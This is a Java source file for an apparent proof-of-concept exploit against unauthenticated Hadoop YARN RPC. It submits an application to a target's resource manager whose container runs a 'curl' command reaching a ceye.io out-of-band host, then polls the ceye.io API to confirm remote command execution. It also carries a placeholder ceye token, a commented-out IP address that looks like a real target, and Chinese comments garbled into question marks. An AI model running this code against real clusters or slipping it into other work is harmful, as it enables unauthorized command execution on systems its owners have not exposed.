package com.hadoop.authentication;

import org.apache.hadoop.tracing.SpanReceiverInfo;
import org.apache.hadoop.yarn.api.records.*;
import org.apache.hadoop.yarn.client.api.YarnClient;
import org.apache.hadoop.yarn.client.api.YarnClientApplication;
import org.apache.hadoop.yarn.conf.YarnConfiguration;
import org.apache.hadoop.yarn.exceptions.YarnException;
import org.apache.commons.cli.*;
import org.slf4j.LoggerFactory;


import javax.ws.rs.OPTIONS;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.*;
import java.util.logging.Logger;
import java.util.regex.Pattern;

public class YarnRPCUnauthenticationAccess {
//    private static Logger logger = LoggerFactory.getLogger(YarnRPCUnauthenticationAccess.class);
    public static void main(String[] args) throws IOException, YarnException {
//        Logger logger = LoggerFactory.getLogger(YarnRPCUnauthenticationAccess.class);
        Option targetIP = new Option("t","target",true,"setting target IP");
        targetIP.setRequired(false);
        Option id = new Option("i","id",true,"your ceye.io identify");
        id.setRequired(false);
        Option token = new Option("o","token",true,"your ceye.io token");
        token.setRequired(false);

        Options options = new Options();
        options.addOption(targetIP);
        options.addOption(id);
        options.addOption(token);
        CommandLine cli = null;
        DefaultParser defaultParser = new DefaultParser();
        HelpFormatter helpFormatter = new HelpFormatter();
        try {
            cli = defaultParser.parse(options,args);
        } catch (ParseException e) {
            helpFormatter.printHelp("Specify the corresponding parameters using the following instructions:\n[java -jar Hadoop.jar -t xxx.xxx.xxx.xxx -i test.ceye.id -o yourCeyeToken]", options);
            e.printStackTrace();
        }
        if (!cli.hasOption("t")){
            helpFormatter.printHelp("Specify the corresponding parameters using the following instructions:\n[java -jar Hadoop.jar -t xxx.xxx.xxx.xxx -i test.ceye.id -o yourCeyeToken]", options);
            return;
        }
        String t = cli.getOptionValue("t", "127.0.0.1");
        String i = cli.getOptionValue("i", "xxxxxx.ceye.io");  //ceye oob address
        String o = cli.getOptionValue("o", "047555f381xxxxxxd280fb44e3");  //ceye token
//        String pattern = "(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)\\.(25[0-5]|2[0-4]\\d|[0-1]\\d{2}|[1-9]?\\d)";
//        boolean matches = Pattern.matches(pattern, t);
//        if (!matches){
//            System.out.println("IP?????????????????????");
//        }
//        String c = cli.getOptionValue("c", "whoami");
//        ??????yarn?????????
        //139.9.154.175
        String rmAddress = t;
        YarnConfiguration entries = new YarnConfiguration();
        entries.set(YarnConfiguration.RM_ADDRESS,rmAddress+":"+"8032" );
        YarnClient yarnClient = YarnClient.createYarnClient();
        yarnClient.init(entries);
        yarnClient.start();
        //??????yarn????????????
        YarnClientApplication application = yarnClient.createApplication();
        List<String> commands = new ArrayList<>();
        String s = Long.toString(System.currentTimeMillis());
        String cmd = "curl "+s+"."+i;
        commands.add(cmd);
//        System.out.printf(cmd);
        ContainerLaunchContext amContainer = ContainerLaunchContext.newInstance(null, null, commands, null, null, null);
        ApplicationSubmissionContext applicationSubmissionContext = application.getApplicationSubmissionContext();
        applicationSubmissionContext.setResource(Resource.newInstance(100,1));
        applicationSubmissionContext.setPriority(Priority.newInstance(0));
        applicationSubmissionContext.setQueue("default");
        applicationSubmissionContext.setApplicationName("truman.ApplicationMaster");
        applicationSubmissionContext.setAMContainerSpec(amContainer);
        yarnClient.submitApplication(applicationSubmissionContext);
        ApplicationId applicationId = applicationSubmissionContext.getApplicationId();

        //????????????????????????
//        System.out.println(s);
        try {
            Thread.currentThread().sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        String url = "http://api.ceye.io/v1/records?token="+o+"&type=dns&filter="+s;
        URL url1 = new URL(url);
        StringBuffer resultBuffer = null;
        BufferedReader buffer = null;
        HttpURLConnection httpURLConnection = (HttpURLConnection) url1.openConnection();
        httpURLConnection.setRequestMethod("GET");
        httpURLConnection.setRequestProperty("Content-Type", "application/json;charset=GBK");
        httpURLConnection.setDoOutput(true);
        httpURLConnection.setDoInput(true);
        httpURLConnection.setUseCaches(false);
        int responseCode = httpURLConnection.getResponseCode();
        String response = null;
        if (responseCode == HttpURLConnection.HTTP_OK){
            InputStream inputStream = httpURLConnection.getInputStream();
            resultBuffer = new StringBuffer();
            String line;
            buffer = new BufferedReader(new InputStreamReader(inputStream, "GBK"));
            while ((line = buffer.readLine()) != null) {
                resultBuffer.append(line);
            }
            response = resultBuffer.toString();
        }
//        System.out.println(response);
        if (response.contains(s)){
            System.out.println("???IP??????Hadoop Yarn RPC?????????????????????????????????");
        }
        yarnClient.killApplication(applicationId);
    }

}
